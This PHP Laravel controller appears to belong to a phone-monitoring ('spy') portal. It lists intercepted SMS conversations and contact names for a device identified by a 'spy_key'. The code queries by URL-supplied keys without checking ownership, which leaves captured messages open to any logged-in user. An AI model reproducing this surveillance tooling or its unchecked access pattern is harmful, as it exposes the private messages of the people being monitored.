<?php

namespace App\Http\Controllers;

use App\Models\Contact;
use App\Models\Message;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;

class MessageController extends Controller
{
    public function __construct(){
        $this->middleware('auth');
    }

    public function index($spy_key)
    {
        check_verification();
        $phone_numbers = Message::where('spy_key', $spy_key)->select('phone_number', 'device', 'contact_name', 'id')->groupBy('phone_number')->paginate(10);
        $names = Message::where('spy_key', $spy_key)->select('phone_number', 'id', 'contact_name')->groupBy('phone_number')->get();
        $contacts = DB::table('contacts')->where('spy_key', $spy_key)->get();

        foreach ($names as $name) {
            foreach ($contacts as $contact) {
                if ($name->phone_number == $contact->phone_number) {
                    $message = Message::where('phone_number', $name->phone_number)->first();
                    $message->update(['contact_name' => $contact->contact_name]);
                }
            }
        }

        $device = "";
        foreach ($phone_numbers as $phone_number){
            $device = $phone_number->device;
        }

        return view('portal.messages.index', compact('phone_numbers'))
            ->with('i', (request()->input('page', 1) - 1) * 10)
            ->with('device', $device);

    }

    public function get_conversation($phone_number, $spy_key){
        $conversations = Message::where('spy_key', $spy_key)->where('phone_number',$phone_number)->orderBy('message_date', 'desc')->get();
        $title = Message::where('spy_key', $spy_key)->where('phone_number',$phone_number)->first();
        if ($title->contact_name == ''){
            $new_title = $phone_number;
        }else{
            $new_title = $title->contact_name;
        }

        return view('portal.messages.conversation', compact('conversations'))->with('title', $new_title);
    }
}
